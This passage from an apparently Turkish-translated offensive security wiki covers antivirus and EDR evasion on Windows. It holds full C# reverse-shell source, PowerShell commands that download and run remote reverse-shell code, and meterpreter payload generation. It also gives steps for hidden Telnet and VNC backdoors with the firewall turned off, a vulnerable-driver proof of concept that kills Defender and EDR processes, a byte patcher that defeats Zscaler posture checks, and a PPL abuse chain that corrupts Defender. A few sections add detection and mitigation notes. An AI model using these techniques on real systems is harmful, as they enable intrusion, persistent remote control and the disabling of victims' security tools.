- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanarak LLVM-supported languages için ince taneli bir code obfuscation framework'üdür. ROPfuscator, normal talimatları ROP zincirlerine dönüştürerek bir programı assembly code seviyesinde obfuscate eder ve normal kontrol akışına dair doğal algımızı bozar.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim ile yazılmış bir .NET PE Crypter'dır.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor mevcut EXE/DLL'leri shellcode'a dönüştürebilir ve ardından bunları yükleyebilir.

## SmartScreen & MoTW

İnternetten indirilen bazı yürütülebilir dosyaları indirip çalıştırdığınızda bu ekranı görmüş olabilirsiniz.

Microsoft Defender SmartScreen, potansiyel olarak zararlı uygulamaların çalıştırılmasına karşı son kullanıcıyı korumayı amaçlayan bir güvenlik mekanizmasıdır.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen esas olarak itibar tabanlı bir yaklaşım ile çalışır; bu da nadiren indirilen uygulamaların SmartScreen'i tetikleyeceği ve kullanıcıyı uyarıp dosyanın çalıştırılmasını engelleyeceği anlamına gelir (dosya yine de More Info -> Run anyway tıklanarak çalıştırılabilir).

**MoTW** (Mark of The Web), Zone.Identifier adında bir [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) olup, internetten indirilen dosyalar için otomatik olarak oluşturulur ve indirildiği URL'yi içerir.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>İnternetten indirilen bir dosya için Zone.Identifier ADS'sinin kontrol edilmesi.</p></figcaption></figure>

> [!TIP]
> İnternetten indirilen yürütülebilir dosyaların **trusted** bir signing certificate ile imzalanmış olması durumunda SmartScreen'in **tetiklenmeyeceğini** unutmamak önemlidir.

Payloads'larınızın Mark of The Web'e maruz kalmasını önlemenin çok etkili bir yolu, bunları bir ISO gibi bir konteynerin içine paketlemektir. Bunun nedeni, Mark-of-the-Web (MOTW)'ün non-NTFS hacimlere uygulanamamasıdır.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) payloads'ları Mark-of-the-Web'den kaçınmak için çıktı konteynerlerine paketleyen bir araçtır.

Kullanım örneği:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW), Windows'ta uygulamaların ve sistem bileşenlerinin **olayları kaydetmesine** olanak tanıyan güçlü bir loglama mekanizmasıdır. Ancak, bu mekanizma güvenlik ürünleri tarafından kötü niyetli aktiviteleri izlemek ve tespit etmek için de kullanılabilir.

AMSI'nin nasıl devre dışı bırakıldığına (bypass) benzer şekilde, kullanıcı alanı prosesinin **`EtwEventWrite`** fonksiyonunun hiçbir olay kaydetmeden hemen dönecek şekilde ayarlanması da mümkündür. Bu, fonksiyonun bellekte patchlenmesiyle yapılır; böylece ilgili proses için ETW loglaması fiilen devre dışı bırakılmış olur.

Daha fazla bilgi için şunlara bakabilirsiniz: **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) ve [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

C# ikili dosyalarını belleğe yüklemek uzun zamandır bilinen bir yöntemdir ve AV tarafından yakalanmadan post-exploitation araçlarınızı çalıştırmak için hâlâ çok iyi bir yoldur.

Payload doğrudan diske temas etmeden belleğe yükleneceği için, tüm süreç için yalnızca AMSI'yi patchlemeyi düşünmemiz gerekecek.

Çoğu C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, vb.) zaten C# assembly'lerini doğrudan bellekte çalıştırma yeteneği sağlıyor, fakat bunu yapmanın farklı yolları vardır:

- **Fork\&Run**

Bu, **yeni bir kurban proses spawn etmek**, post-exploitation kötü amaçlı kodunuzu o yeni prosese enjekte etmek, kötü amaçlı kodu çalıştırmak ve iş bitince yeni prosesi sonlandırmak anlamına gelir. Bunun avantajları ve dezavantajları vardır. Fork and run yönteminin avantajı, yürütmenin Beacon implant prosesimizin **dışında** gerçekleşmesidir. Bu, post-exploitation eylemimiz sırasında bir şey ters gider veya yakalanırsa implantımızın hayatta kalma olasılığının **çok daha yüksek** olduğu anlamına gelir. Dezavantajı ise **Behavioural Detections** tarafından yakalanma olasılığınızın **daha yüksek** olmasıdır.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Bu, post-exploitation kötü amaçlı kodu **kendi prosesinin içine** enjekte etmekle ilgilidir. Böylece yeni bir proses oluşturmak ve bunun AV tarafından taranması zorunluluğundan kaçınabilirsiniz, fakat dezavantajı, payload'unuzun yürütülmesinde bir şeyler ters giderse beacon'ınızı kaybetme olasılığınızın **çok daha yüksek** olmasıdır çünkü proses çökebilir.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Eğer C# Assembly loading hakkında daha fazla okumak isterseniz, şu makaleye bakabilirsiniz: [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) ve onların InlineExecute-Assembly BOF'u ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

Ayrıca C# Assembly'lerini **PowerShell'den** yükleyebilirsiniz, bakınız [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t'in videosu](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)'ta önerildiği gibi, saldırganın kontrolündeki SMB paylaşımına kurulu yorumlayıcı ortamına erişim vererek diğer diller kullanılarak kötü amaçlı kod yürütmek mümkündür.

Interpreter Binaries'e ve SMB paylaşımındaki ortama erişim vererek, ele geçirilmiş makinenin belleği içinde bu dillerde istediğiniz kodu **çalıştırabilirsiniz**.

Repo şu sonucu belirtiyor: Defender hâlâ script'leri tarıyor ancak Go, Java, PHP vb. kullanarak **statik imzaları atlatmak için daha fazla esneklik** elde ediyoruz. Bu dillerde rastgele obfuksiyon edilmemiş reverse shell script'leri ile yapılan testler başarılı oldu.

## TokenStomping

Token stomping, saldırganın bir erişim token'ını veya bir güvenlik ürünü (EDR veya AV gibi) üzerinde **manipülasyon yapmasına** olanak veren bir tekniktir; böylece token'ın yetkileri azaltılarak proses ölmez ama kötü niyetli aktiviteleri kontrol etme izinleri olmaz.

Bunu önlemek için Windows, güvenlik proseslerinin tokenları üzerinde dış proseslerin handle almasını **engelleyebilir**.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

[**bu blog yazısında**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) açıklandığı gibi, kurbanın bilgisayarına Chrome Remote Desktop'ı kurup daha sonra ele geçirmek ve persistence sağlamak oldukça kolaydır:
1. https://remotedesktop.google.com/ adresinden indirin, "Set up via SSH"e tıklayın ve ardından Windows için MSI dosyasını indirmek üzere MSI dosyasına tıklayın.
2. Kurulumu sessizce çalıştırın (yönetici gerekli): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop sayfasına geri dönüp next'e tıklayın. Sihirbaz sizden yetkilendirme isteyecektir; devam etmek için Authorize butonuna tıklayın.
4. Verilen parametreyi bazı ayarlamalarla çalıştırın: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (GUI'yi kullanmadan pin'i ayarlamaya izin veren pin parametresine dikkat edin).

## Advanced Evasion

Evasion çok karmaşık bir konudur; bazen tek bir sistemde birçok farklı telemetri kaynağını hesaba katmanız gerekir, bu yüzden olgun ortamlarda tamamen tespit edilmeden kalmak neredeyse imkansızdır.

Her hedef ortamın kendi güçlü ve zayıf yönleri olacaktır.

Daha gelişmiş Evasion tekniklerine dair bir fikir edinmek için [@ATTL4S](https://twitter.com/DaniLJ94)'ın bu konuşmasını izlemenizi şiddetle tavsiye ederim.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Bu ayrıca [@mariuszbit](https://twitter.com/mariuszbit)'in Depth içinde Evasion hakkında harika bir diğer konuşmasıdır.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) aracını kullanabilirsiniz; bu araç, binary'nin parçalarını **kaldırarak** Defender'ın hangi kısmı zararlı bulduğunu bulana kadar devam eder ve size parçaları ayırarak gösterir.\
Aynı işi yapan bir diğer araç ise [**avred**](https://github.com/dobin/avred) olup, hizmeti açık bir web üzerinden sunmaktadır: [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Windows10'a kadar, tüm Windows sürümleri yönetici olarak kurabileceğiniz bir **Telnet server** ile geliyordu:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Sistem başlatıldığında onu **başlat** ve şimdi **çalıştır**:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Telnet portunu değiştir** (stealth) ve firewall'ı devre dışı bırak:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (bin downloads'ı istiyorsunuz, setup değil)

**HOST ÜZERİNDE**: Execute _**winvnc.exe**_ ve sunucuyu yapılandırın:

- Seçenek _Disable TrayIcon_'ı etkinleştirin
- _VNC Password_ içinde bir parola belirleyin
- _View-Only Password_ içinde bir parola belirleyin

Sonra, binary _**winvnc.exe**_ ve yeni oluşturulan dosya _**UltraVNC.ini**_'yi victim içine taşıyın

#### **Reverse connection**

attacker, kendi host'unda binary `vncviewer.exe -listen 5900`'ı çalıştırmalı; böylece reverse VNC connection yakalamaya hazır olur. Sonra, victim içinde: winvnc daemon'u başlatın `winvnc.exe -run` ve çalıştırın `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Stealth'i korumak için birkaç şeyi yapmamalısınız

- `winvnc` zaten çalışıyorsa başlatmayın yoksa bir [popup](https://i.imgur.com/1SROTTl.png) tetiklenir. Çalışıp çalışmadığını `tasklist | findstr winvnc` ile kontrol edin
- Aynı dizinde `UltraVNC.ini` olmadan `winvnc` başlatmayın yoksa [config window](https://i.imgur.com/rfMQWcf.png) açılmasına sebep olur
- Yardım için `winvnc -h` çalıştırmayın yoksa bir [popup](https://i.imgur.com/oc18wcu.png) tetiklenir

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT'in İçinde:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Şimdi **lister'ı başlatın** `msfconsole -r file.rc` ile ve **çalıştırın** **xml payload** ile:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Mevcut defender işlemi çok hızlı sonlandıracaktır.**

### Kendi reverse shell'imizi derlemek

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### İlk C# Revershell

Bunu şu komutla derleyin:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Şununla birlikte kullanın:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# derleyicisini kullanma
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Otomatik indirme ve yürütme:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# için obfuscator listesi: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Python kullanarak injectors oluşturma örneği:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Diğer araçlar
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603, küçük bir konsol aracı olan **Antivirus Terminator**'ı, fidye yazılımı bırakmadan önce endpoint korumalarını devre dışı bırakmak için kullandı. Araç, **kendi zayıf ama *imzalı* sürücüsünü** getirir ve Protected-Process-Light (PPL) AV servislerinin bile engelleyemeyeceği ayrıcalıklı kernel işlemlerini gerçekleştirmek için bunu suistimal eder.

Key take-aways
1. **İmzalı sürücü**: Diske yazılan dosya `ServiceMouse.sys` olarak görünür, ancak ikili dosya Antiy Labs’in “System In-Depth Analysis Toolkit”ten meşru şekilde imzalanmış `AToolsKrnl64.sys` sürücüsüdür. Sürücü geçerli bir Microsoft imzasına sahip olduğu için Driver-Signature-Enforcement (DSE) etkin olsa bile yüklenir.
2. **Servis kurulumu**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
İlk satır sürücüyü bir **kernel servisi** olarak kaydeder ve ikinci satır onu başlatarak `\\.\ServiceMouse`'ın kullanıcı alanından erişilebilir hale gelmesini sağlar.
3. **Sürücünün açığa çıkardığı IOCTL'ler**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID ile rastgele bir süreci sonlandırma (Defender/EDR servislerini sonlandırmak için kullanıldı) |
| `0x990000D0` | Diskte rastgele bir dosyayı silme |
| `0x990001D0` | Sürücüyü yükten boşaltma ve servisi kaldırma |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Neden işe yarıyor**: BYOVD kullanıcı modu korumalarını tamamen atlar; kernel'de çalışan kod *korumalı* süreçleri açabilir, sonlandırabilir veya PPL/PP, ELAM veya diğer sertleştirme özelliklerinden bağımsız olarak kernel nesneleriyle oynayabilir.

Detection / Mitigation
•  Microsoft’un vulnerable-driver engelleme listesini etkinleştirin (`HVCI`, `Smart App Control`) böylece Windows `AToolsKrnl64.sys`'i yüklemeyi reddeder.  
•  Yeni *kernel* servislerin oluşturulmasını izleyin ve bir sürücü dünya-yazılabilir bir dizinden yüklendiğinde veya izin listesinde olmadığında uyarı verin.  
•  Özel device nesnelerine yönelik kullanıcı modu tutamaçları ve bunları takip eden şüpheli `DeviceIoControl` çağrılarını izleyin.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’ın **Client Connector**'ı cihaz-duruş (device-posture) kurallarını yerel olarak uygular ve sonuçları diğer bileşenlere iletmek için Windows RPC'ye dayanır. Tam bir atlatmayı mümkün kılan iki zayıf tasarım seçimi vardır:

1. Posture değerlendirmesi tamamen istemci tarafında gerçekleşir (bir boolean sunucuya gönderilir).  
2. Dahili RPC uç noktaları yalnızca bağlanan yürütülebilir dosyanın **Zscaler tarafından imzalı** olduğunu doğrular (via `WinVerifyTrust`).

Diskteki dört imzalı ikiliyi yama yaparak her iki mekanizma da nötralize edilebilir:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Her zaman `1` döndürür; böylece her kontrol uyumlu sayılır |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ herhangi bir (hatta imzasız) süreç RPC pipe'larına bağlanabilir |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Yerine `mov eax,1 ; ret` konuldu |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Kısa devre yapıldı |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Orijinal dosyaları değiştirip servis yığını yeniden başlattıktan sonra:

* **Tüm** durum kontrolleri **yeşil/uyumlu** olarak görüntülenir.
* İmzalanmamış veya değiştirilmiş ikili dosyalar named-pipe RPC uç noktalarını açabilir (örn. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* İhlal edilen host, Zscaler politikalarıyla tanımlanan iç ağa sınırsız erişim kazanır.

Bu vaka çalışması, tamamen istemci taraflı güven kararlarının ve basit imza kontrollerinin birkaç byte yamasıyla nasıl alt edilebileceğini gösterir.

## Protected Process Light (PPL) ile LOLBINs kullanarak AV/EDR'ı manipüle etme

Protected Process Light (PPL), yalnızca aynı veya daha yüksek düzeydeki protected process'lerin birbirlerine müdahale edebilmesini sağlayan bir signer/seviye hiyerarşisi uygular. Saldırgan amaçlı olarak, eğer meşru şekilde PPL-etkin bir binary başlatıp argümanlarını kontrol edebiliyorsanız, zararsız bir işlevselliği (örn. loglama) AV/EDR tarafından kullanılan korumalı dizinlere karşı kısıtlı, PPL destekli bir yazma ilkeline dönüştürebilirsiniz.

Bir işlemin PPL olarak çalışmasını sağlayanlar
- Hedef EXE (ve yüklenen DLL'ler) PPL-yetenekli bir EKU ile imzalanmış olmalıdır.
- Süreç CreateProcess ile şu flag'ler kullanılarak oluşturulmalıdır: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- İkili'nin imzalayıcısıyla eşleşen uyumlu bir koruma seviyesi talep edilmelidir (örn. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` anti-malware imzalayıcıları için, `PROTECTION_LEVEL_WINDOWS` Windows imzalayıcıları için). Yanlış seviyeler oluşturma sırasında başarısız olur.

Ayrıca PP/PPL ve LSASS korumasına daha geniş bir giriş için bakınız:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Başlatıcı araçları
- Açık kaynak yardımcı: CreateProcessAsPPL (koruma seviyesini seçer ve argümanları hedef EXE'ye iletir):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Kullanım deseni:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- İmzalı sistem ikili dosyası `C:\Windows\System32\ClipUp.exe` kendini başlatır ve çağıranın belirttiği bir yola log dosyası yazmak için bir parametre kabul eder.
- PPL süreci olarak başlatıldığında, dosya yazma işlemi PPL koruması ile gerçekleşir.
- ClipUp boşluk içeren yolları işleyemez; normalde korumalı konumlara işaret etmek için 8.3 kısa yolları kullanın.

8.3 kısa yol yardımcıları
- Kısa adları listelemek için: her üst dizinde `dir /x`.
- cmd'de kısa yolu türetin: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

İstismar zinciri (özet)
1) PPL-capable LOLBIN (ClipUp) öğesini `CREATE_PROTECTED_PROCESS` ile bir başlatıcı kullanarak (ör., CreateProcessAsPPL) çalıştırın.
2) ClipUp'e log-path argümanını vererek korumalı bir AV dizininde (ör., Defender Platform) dosya oluşturmayı zorlayın. Gerekirse 8.3 kısa adları kullanın.
3) Hedef ikili dosya AV tarafından çalışırken genellikle açık/kitleniyorsa (ör., MsMpEng.exe), yazmayı AV başlamadan önce önyüklemede zamanlayın; bunun için daha erken güvenilir şekilde çalışan bir otomatik başlatma servisi kurun. Önyükleme sıralamasını Process Monitor ile doğrulayın (boot logging).
4) Yeniden başlatmada PPL destekli yazma AV ikili dosyalarını kilitlemeden önce gerçekleşir; hedef dosyayı bozar ve başlatmayı engeller.

Örnek çağrı (yollar güvenlik nedeniyle sansürlenmiş/kısaltılmış):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notlar ve kısıtlamalar
- ClipUp'un yazdığı içeriği yerleştirme dışında kontrol edemezsiniz; bu yöntem hassas içerik enjeksiyonundan ziyade bozmaya uygundur.
- Bir hizmeti yüklemek/başlatmak ve yeniden başlatma penceresi için yerel admin/SYSTEM gerekir.
- Zamanlama kritik: hedef açık olmamalı; önyükleme sırasında yürütme dosya kilitlerini önler.

Tespitler
- Özellikle önyükleme sırasında, alışılmadık argümanlarla ve standart olmayan başlatıcılar tarafından parent edilmiş şekilde `ClipUp.exe` oluşturulması.
- Otomatik başlatma için yapılandırılmış yeni hizmetler ve Defender/AV'den önce tutarlı şekilde başlayan şüpheli binaries. Defender başlatma hatalarından önce hizmet oluşturma/değiştirmelerini araştırın.
- Defender binaries/Platform dizinlerinde dosya bütünlüğü izleme; protected-process flag'ına sahip süreçler tarafından beklenmeyen dosya oluşturma/değiştirme.
- ETW/EDR telemetri: `CREATE_PROTECTED_PROCESS` ile oluşturulan süreçlere ve AV dışı binaries tarafından anormal PPL düzeyi kullanımına bakın.

Önlemler
- WDAC/Code Integrity: hangi imzalı binaries'in PPL olarak ve hangi parent'lar altında çalışabileceğini kısıtlayın; meşru bağlamlar dışındaki ClipUp çağrılarını engelleyin.
- Hizmet hijyeni: otomatik başlatma hizmetlerinin oluşturulmasını/değiştirilmesini kısıtlayın ve başlatma sırası manipülasyonunu izleyin.
- Defender tamper protection ve early-launch korumalarının etkin olduğundan emin olun; ikili dosya bozulmasını gösteren başlangıç hatalarını araştırın.
- Ortamınızla uyumluysa güvenlik araçlarını barındıran hacimlerde 8.3 kısa ad üretimini devre dışı bırakmayı düşünün (iyice test edin).

PPL ve araçlar için referanslar
- Microsoft Protected Processes genel bakışı: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU referansı: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon önyükleme kaydı (sıralama doğrulama): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Teknik yazısı (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

